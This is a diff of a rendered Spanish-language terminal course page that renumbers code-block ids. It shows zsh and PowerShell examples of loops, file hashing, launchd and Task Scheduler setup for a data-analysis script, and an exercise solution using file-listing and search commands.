-<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="fu">mide()</span> <span class="kw">{</span> <span class="fu">wc</span> <span class="at">-l</span> <span class="op">&lt;</span> <span class="st">"</span><span class="va">$1</span><span class="st">"</span> <span class="kw">|</span> <span class="fu">tr</span> <span class="at">-d</span> <span class="st">' '</span><span class="kw">;</span> <span class="kw">}</span>              <span class="co"># función: líneas de un fichero</span></span>
-<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> f <span class="kw">in</span> datos/<span class="pp">*</span>.csv<span class="kw">;</span> <span class="cf">do</span></span>
-<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="kw">[[</span> <span class="ot">-f</span> <span class="va">$f</span> <span class="kw">]];</span> <span class="cf">then</span> <span class="bu">print</span> <span class="st">"</span><span class="va">$f</span><span class="st"> </span><span class="va">$(</span><span class="ex">mide</span> <span class="st">"</span><span class="va">$f</span><span class="st">"</span><span class="va">)</span><span class="st">"</span><span class="kw">;</span> <span class="cf">fi</span></span>
-<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span>
-<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="bu">false</span><span class="kw">;</span> <span class="bu">print</span> <span class="st">"false devuelve </span><span class="va">$?</span><span class="st">"</span>                  <span class="co"># 1</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb21"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="co"># ✔ PS7: el mismo patrón</span></span>
-<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> Mide<span class="op">(</span><span class="va">$Ruta</span><span class="op">)</span> <span class="op">{</span> <span class="op">(</span><span class="fu">Get-Content</span> <span class="va">$Ruta</span> <span class="op">|</span> <span class="fu">Measure-Object</span> <span class="op">-</span>Line<span class="op">).</span><span class="fu">Lines</span> <span class="op">}</span></span>
-<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="cf">foreach</span> <span class="op">(</span><span class="va">$f</span> <span class="kw">in</span> <span class="fu">Get-ChildItem</span> datos<span class="op">/*.</span><span class="fu">csv</span><span class="op">)</span> <span class="op">{</span> <span class="cf">if</span> <span class="op">(</span><span class="fu">Test-Path</span> <span class="op">-</span>LiteralPath <span class="va">$f</span> <span class="op">-</span>PathType Leaf<span class="op">)</span> <span class="op">{</span> <span class="st">"{0} {1}"</span> <span class="op">-</span>f <span class="va">$f</span><span class="op">.</span><span class="fu">Name</span><span class="op">,</span> <span class="op">(</span>Mide <span class="va">$f</span><span class="op">)</span> <span class="op">}</span> <span class="op">}</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb22"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co"># ✔ macOS: condiciones, bucle, función y código de salida</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="fu">mide()</span> <span class="kw">{</span> <span class="fu">wc</span> <span class="at">-l</span> <span class="op">&lt;</span> <span class="st">"</span><span class="va">$1</span><span class="st">"</span> <span class="kw">|</span> <span class="fu">tr</span> <span class="at">-d</span> <span class="st">' '</span><span class="kw">;</span> <span class="kw">}</span>              <span class="co"># función: líneas de un fichero</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> f <span class="kw">in</span> datos/<span class="pp">*</span>.csv<span class="kw">;</span> <span class="cf">do</span></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="kw">[[</span> <span class="ot">-f</span> <span class="va">$f</span> <span class="kw">]];</span> <span class="cf">then</span> <span class="bu">print</span> <span class="st">"</span><span class="va">$f</span><span class="st"> </span><span class="va">$(</span><span class="ex">mide</span> <span class="st">"</span><span class="va">$f</span><span class="st">"</span><span class="va">)</span><span class="st">"</span><span class="kw">;</span> <span class="cf">fi</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="bu">false</span><span class="kw">;</span> <span class="bu">print</span> <span class="st">"false devuelve </span><span class="va">$?</span><span class="st">"</span>                  <span class="co"># 1</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb23"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="co"># ✔ PS7: el mismo patrón</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> Mide<span class="op">(</span><span class="va">$Ruta</span><span class="op">)</span> <span class="op">{</span> <span class="op">(</span><span class="fu">Get-Content</span> <span class="va">$Ruta</span> <span class="op">|</span> <span class="fu">Measure-Object</span> <span class="op">-</span>Line<span class="op">).</span><span class="fu">Lines</span> <span class="op">}</span></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="cf">foreach</span> <span class="op">(</span><span class="va">$f</span> <span class="kw">in</span> <span class="fu">Get-ChildItem</span> datos<span class="op">/*.</span><span class="fu">csv</span><span class="op">)</span> <span class="op">{</span> <span class="cf">if</span> <span class="op">(</span><span class="fu">Test-Path</span> <span class="op">-</span>LiteralPath <span class="va">$f</span> <span class="op">-</span>PathType Leaf<span class="op">)</span> <span class="op">{</span> <span class="st">"{0} {1}"</span> <span class="op">-</span>f <span class="va">$f</span><span class="op">.</span><span class="fu">Name</span><span class="op">,</span> <span class="op">(</span>Mide <span class="va">$f</span><span class="op">)</span> <span class="op">}</span> <span class="op">}</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p>En el proyecto de ejemplo (en el repositorio, carpeta <code>c2-terminal/_ejemplo/proyecto-viga/</code>), <code>scripts/ejecutar.zsh</code> y <code>scripts/ejecutar.ps1</code> aplican todo esto: comprueban la entrada (código 2), la presencia de Python (4), propagan el fallo del análisis (3) y escriben un registro. <strong>Windows:</strong> en un Windows con la política de ejecución por defecto de un cliente (<em>Restricted</em>), no se pueden ejecutar scripts <code>.ps1</code>; según Microsoft Learn la política no es una frontera de seguridad y se cambia, para tu usuario, con <code>Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser</code> †. Hazlo solo si lo entiendes.</p>
 <div class="callout callout-style-default callout-warning callout-titled" title="Errores frecuentes">
 <div class="callout-header d-flex align-content-center">
@@ -1181,14 +1286,14 @@ window.Quarto = {
 <ul class="nav nav-tabs" role="tablist"><li class="nav-item" role="presentation"><a class="nav-link active" id="tabset-7-1-tab" data-bs-toggle="tab" data-bs-target="#tabset-7-1" role="tab" aria-controls="tabset-7-1" aria-selected="true" href="">macOS (Zsh) ✔</a></li><li class="nav-item" role="presentation"><a class="nav-link" id="tabset-7-2-tab" data-bs-toggle="tab" data-bs-target="#tabset-7-2" role="tab" aria-controls="tabset-7-2" aria-selected="false" href="">Windows (PowerShell) ✔ PS7</a></li></ul>
 <div class="tab-content">
 <div id="tabset-7-1" class="tab-pane active" role="tabpanel" aria-labelledby="tabset-7-1-tab">
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb22"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">shasum</span> <span class="at">-a</span> 256 datos/aceleracion.csv           <span class="co"># huella del original</span></span>
-<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> datos/aceleracion.csv copia.csv</span>
-<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="ex">shasum</span> <span class="at">-a</span> 256 copia.csv                       <span class="co"># debe ser idéntica</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb24"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">shasum</span> <span class="at">-a</span> 256 datos/aceleracion.csv           <span class="co"># huella del original</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> datos/aceleracion.csv copia.csv</span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="ex">shasum</span> <span class="at">-a</span> 256 copia.csv                       <span class="co"># debe ser idéntica</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </div>
 <div id="tabset-7-2" class="tab-pane" role="tabpanel" aria-labelledby="tabset-7-2-tab">
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb23"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>Get-FileHash <span class="op">-</span>Algorithm SHA256 datos<span class="op">/</span>aceleracion<span class="op">.</span><span class="fu">csv</span></span>
-<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="fu">Copy-Item</span> datos<span class="op">/</span>aceleracion<span class="op">.</span><span class="fu">csv</span> copia<span class="op">.</span><span class="fu">csv</span></span>
-<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>Get-FileHash <span class="op">-</span>Algorithm SHA256 copia<span class="op">.</span><span class="fu">csv</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb25"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a>Get-FileHash <span class="op">-</span>Algorithm SHA256 datos<span class="op">/</span>aceleracion<span class="op">.</span><span class="fu">csv</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="fu">Copy-Item</span> datos<span class="op">/</span>aceleracion<span class="op">.</span><span class="fu">csv</span> copia<span class="op">.</span><span class="fu">csv</span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>Get-FileHash <span class="op">-</span>Algorithm SHA256 copia<span class="op">.</span><span class="fu">csv</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 </div>
 </div>
 </div>
@@ -1249,30 +1354,30 @@ window.Quarto = {
 <ul>
 <li><strong>macOS: launchd.</strong> Cada tarea es un fichero <code>.plist</code> en <code>~/Library/LaunchAgents/</code> (agentes de usuario: se ejecutan mientras tu sesión está abierta). Campos clave: <code>Label</code>, <code>ProgramArguments</code>, <code>StartCalendarInterval</code> o <code>StartInterval</code>, <code>StandardOutPath</code>, <code>StandardErrorPath</code> (documentación de Apple en el archivo, de 2016; consulta <code>man launchd.plist</code>). Ejemplo para ejecutar el análisis cada día a las 07:30 (el plist se ha validado con <code>plutil -lint</code>, <strong>no se ha cargado</strong> porque crea una tarea persistente):</li>
 </ul>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb24"><pre class="sourceCode xml code-with-copy"><code class="sourceCode xml"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span> <span class="ot">version=</span><span class="st">"1.0"</span> <span class="ot">encoding=</span><span class="st">"UTF-8"</span><span class="fu">?&gt;</span></span>
-<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">plist</span> PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"<span class="dt">&gt;</span></span>
-<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">plist</span> <span class="ot">version=</span><span class="st">"1.0"</span>&gt;</span>
-<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">dict</span>&gt;</span>
-<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;Label&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">string</span>&gt;es.claudedo.analisis-viga&lt;/<span class="kw">string</span>&gt;</span>
-<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;ProgramArguments&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">array</span>&gt;&lt;<span class="kw">string</span>&gt;/bin/zsh&lt;/<span class="kw">string</span>&gt;&lt;<span class="kw">string</span>&gt;/Users/ana/proyecto-viga/scripts/ejecutar.zsh&lt;/<span class="kw">string</span>&gt;&lt;/<span class="kw">array</span>&gt;</span>
-<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;StartCalendarInterval&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">dict</span>&gt;&lt;<span class="kw">key</span>&gt;Hour&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">integer</span>&gt;7&lt;/<span class="kw">integer</span>&gt;&lt;<span class="kw">key</span>&gt;Minute&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">integer</span>&gt;30&lt;/<span class="kw">integer</span>&gt;&lt;/<span class="kw">dict</span>&gt;</span>
-<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;StandardOutPath&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">string</span>&gt;/Users/ana/proyecto-viga/resultados/launchd.log&lt;/<span class="kw">string</span>&gt;</span>
-<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;StandardErrorPath&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">string</span>&gt;/Users/ana/proyecto-viga/resultados/launchd.err&lt;/<span class="kw">string</span>&gt;</span>
-<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">dict</span>&gt;</span>
-<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">plist</span>&gt;</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb25"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">plutil</span> <span class="at">-lint</span> es.claudedo.analisis-viga.plist                                       <span class="co"># ✔ comprueba la sintaxis</span></span>
-<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="ex">launchctl</span> bootstrap gui/<span class="va">$(</span><span class="fu">id</span> <span class="at">-u</span><span class="va">)</span> ~/Library/LaunchAgents/es.claudedo.analisis-viga.plist   <span class="co"># carga la tarea</span></span>
-<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a><span class="ex">launchctl</span> kickstart gui/<span class="va">$(</span><span class="fu">id</span> <span class="at">-u</span><span class="va">)</span>/es.claudedo.analisis-viga                          <span class="co"># la ejecuta ya (prueba)</span></span>
-<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="ex">launchctl</span> bootout gui/<span class="va">$(</span><span class="fu">id</span> <span class="at">-u</span><span class="va">)</span>/es.claudedo.analisis-viga                            <span class="co"># la descarga</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb26"><pre class="sourceCode xml code-with-copy"><code class="sourceCode xml"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span> <span class="ot">version=</span><span class="st">"1.0"</span> <span class="ot">encoding=</span><span class="st">"UTF-8"</span><span class="fu">?&gt;</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;!DOCTYPE</span> <span class="dt">plist</span> PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"<span class="dt">&gt;</span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">plist</span> <span class="ot">version=</span><span class="st">"1.0"</span>&gt;</span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">dict</span>&gt;</span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;Label&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">string</span>&gt;es.claudedo.analisis-viga&lt;/<span class="kw">string</span>&gt;</span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;ProgramArguments&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">array</span>&gt;&lt;<span class="kw">string</span>&gt;/bin/zsh&lt;/<span class="kw">string</span>&gt;&lt;<span class="kw">string</span>&gt;/Users/ana/proyecto-viga/scripts/ejecutar.zsh&lt;/<span class="kw">string</span>&gt;&lt;/<span class="kw">array</span>&gt;</span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;StartCalendarInterval&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">dict</span>&gt;&lt;<span class="kw">key</span>&gt;Hour&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">integer</span>&gt;7&lt;/<span class="kw">integer</span>&gt;&lt;<span class="kw">key</span>&gt;Minute&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">integer</span>&gt;30&lt;/<span class="kw">integer</span>&gt;&lt;/<span class="kw">dict</span>&gt;</span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;StandardOutPath&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">string</span>&gt;/Users/ana/proyecto-viga/resultados/launchd.log&lt;/<span class="kw">string</span>&gt;</span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">key</span>&gt;StandardErrorPath&lt;/<span class="kw">key</span>&gt;&lt;<span class="kw">string</span>&gt;/Users/ana/proyecto-viga/resultados/launchd.err&lt;/<span class="kw">string</span>&gt;</span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">dict</span>&gt;</span>
+<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">plist</span>&gt;</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb27"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="ex">plutil</span> <span class="at">-lint</span> es.claudedo.analisis-viga.plist                                       <span class="co"># ✔ comprueba la sintaxis</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="ex">launchctl</span> bootstrap gui/<span class="va">$(</span><span class="fu">id</span> <span class="at">-u</span><span class="va">)</span> ~/Library/LaunchAgents/es.claudedo.analisis-viga.plist   <span class="co"># carga la tarea</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="ex">launchctl</span> kickstart gui/<span class="va">$(</span><span class="fu">id</span> <span class="at">-u</span><span class="va">)</span>/es.claudedo.analisis-viga                          <span class="co"># la ejecuta ya (prueba)</span></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="ex">launchctl</span> bootout gui/<span class="va">$(</span><span class="fu">id</span> <span class="at">-u</span><span class="va">)</span>/es.claudedo.analisis-viga                            <span class="co"># la descarga</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p>Las tres órdenes de <code>launchctl</code> están descritas en <code>man launchctl</code>; no se han ejecutado.</p>
 <ul>
 <li><strong>Windows: Programador de tareas †.</strong></li>
 </ul>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb26"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="va">$accion</span>  <span class="op">=</span> New-ScheduledTaskAction <span class="op">-</span>Execute <span class="st">"pwsh.exe"</span> <span class="op">-</span>Argument <span class="st">"-NoProfile -File C:\proyecto-viga\scripts\ejecutar.ps1"</span></span>
-<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="va">$cuando</span>  <span class="op">=</span> New-ScheduledTaskTrigger <span class="op">-</span>Daily <span class="op">-</span>At <span class="dv">7</span><span class="op">:</span>30am</span>
-<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a>Register-ScheduledTask <span class="op">-</span>TaskName <span class="st">"AnalisisViga"</span> <span class="op">-</span>Action <span class="va">$accion</span> <span class="op">-</span>Trigger <span class="va">$cuando</span> <span class="op">-</span>Description <span class="st">"Análisis diario de la viga"</span></span>
-<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>Start-ScheduledTask <span class="op">-</span>TaskName <span class="st">"AnalisisViga"</span>     <span class="co"># prueba manual</span></span>
-<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a>Unregister-ScheduledTask <span class="op">-</span>TaskName <span class="st">"AnalisisViga"</span> <span class="op">-</span>Confirm<span class="op">:</span><span class="va">$false</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb28"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="va">$accion</span>  <span class="op">=</span> New-ScheduledTaskAction <span class="op">-</span>Execute <span class="st">"pwsh.exe"</span> <span class="op">-</span>Argument <span class="st">"-NoProfile -File C:\proyecto-viga\scripts\ejecutar.ps1"</span></span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="va">$cuando</span>  <span class="op">=</span> New-ScheduledTaskTrigger <span class="op">-</span>Daily <span class="op">-</span>At <span class="dv">7</span><span class="op">:</span>30am</span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a>Register-ScheduledTask <span class="op">-</span>TaskName <span class="st">"AnalisisViga"</span> <span class="op">-</span>Action <span class="va">$accion</span> <span class="op">-</span>Trigger <span class="va">$cuando</span> <span class="op">-</span>Description <span class="st">"Análisis diario de la viga"</span></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a>Start-ScheduledTask <span class="op">-</span>TaskName <span class="st">"AnalisisViga"</span>     <span class="co"># prueba manual</span></span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a>Unregister-ScheduledTask <span class="op">-</span>TaskName <span class="st">"AnalisisViga"</span> <span class="op">-</span>Confirm<span class="op">:</span><span class="va">$false</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p>Según Microsoft Learn, <code>Register-ScheduledTask</code> registra la tarea (por defecto, con tu usuario); <code>-RunLevel Highest</code> pide privilegios elevados, que <strong>no debes pedir salvo necesidad</strong>.</p>
 <p><strong>Buenas prácticas de una tarea programada:</strong> ruta <strong>absoluta</strong> a todo (el entorno no es el de tu terminal), registro con fecha, código de salida significativo, una ejecución de prueba antes de confiarla, y una <strong>alarma</strong> si falla (que alguien se entere). Más sobre esto en <a href="../c8-automatizar/index.html">C8</a>.</p>
 </section>
@@ -1328,7 +1433,7 @@ window.Quarto = {
 <li>Responde: ¿qué ficheros crees que <strong>no</strong> deberían versionarse y por qué? (mira <code>.gitignore</code> y <code>.env.ejemplo</code>).</li>
 </ol>
 <div class="callout callout-style-default callout-note callout-titled" title="Solución">
-<div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-7-contents" aria-controls="callout-7" aria-expanded="false" aria-label="Toggle callout">
+<div class="callout-header d-flex align-content-center collapsed" data-bs-toggle="collapse" data-bs-target=".callout-8-contents" aria-controls="callout-8" aria-expanded="false" aria-label="Toggle callout">
 <div class="callout-icon-container">
 <i class="callout-icon"></i>
 </div>
@@ -1337,18 +1442,18 @@ window.Quarto = {
 </div>
 <div class="callout-btn-toggle d-inline-block border-0 py-1 ps-1 pe-0 float-end"><i class="callout-toggle"></i></div>
 </div>
-<div id="callout-7" class="callout-7-contents callout-collapse collapse">
+<div id="callout-8" class="callout-8-contents callout-collapse collapse">
 <div class="callout-body-container callout-body">
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb27"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-A</span></span>
-<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> . <span class="dt">\(</span> <span class="at">-name</span> <span class="st">"*.qmd"</span> <span class="at">-o</span> <span class="at">-name</span> <span class="st">"*.py"</span> <span class="dt">\)</span> <span class="kw">|</span> <span class="fu">sort</span></span>
-<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="at">-rn</span> <span class="st">"TODO"</span> <span class="at">--include</span><span class="op">=</span><span class="st">"*.md"</span> <span class="at">--include</span><span class="op">=</span><span class="st">"*.qmd"</span> <span class="at">--include</span><span class="op">=</span><span class="st">"*.txt"</span> .</span>
-<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="fu">wc</span> <span class="at">-l</span> datos/aceleracion.csv</span>
-<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> <span class="at">-1</span> <span class="st">"notas de campo.txt"</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb28"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ChildItem</span> <span class="op">-</span>Force</span>
-<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ChildItem</span> <span class="op">-</span>Recurse <span class="op">-</span>Include <span class="op">*.</span><span class="fu">qmd</span><span class="op">,*.</span><span class="fu">py</span> <span class="op">-</span>File</span>
-<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-ChildItem</span> <span class="op">-</span>Recurse <span class="op">-</span>File <span class="op">-</span>Include <span class="op">*.</span><span class="fu">md</span><span class="op">,*.</span><span class="fu">qmd</span><span class="op">,*.</span><span class="fu">txt</span> <span class="op">|</span> <span class="fu">Select-String</span> <span class="op">-</span>Pattern <span class="st">"TODO"</span></span>
-<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="op">(</span><span class="fu">Get-Content</span> datos<span class="op">/</span>aceleracion<span class="op">.</span><span class="fu">csv</span> <span class="op">|</span> <span class="fu">Measure-Object</span> <span class="op">-</span>Line<span class="op">).</span><span class="fu">Lines</span></span>
-<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-Content</span> <span class="op">-</span>LiteralPath <span class="st">"notas de campo.txt"</span> <span class="op">-</span>TotalCount <span class="dv">1</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb29"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-A</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> . <span class="dt">\(</span> <span class="at">-name</span> <span class="st">"*.qmd"</span> <span class="at">-o</span> <span class="at">-name</span> <span class="st">"*.py"</span> <span class="dt">\)</span> <span class="kw">|</span> <span class="fu">sort</span></span>
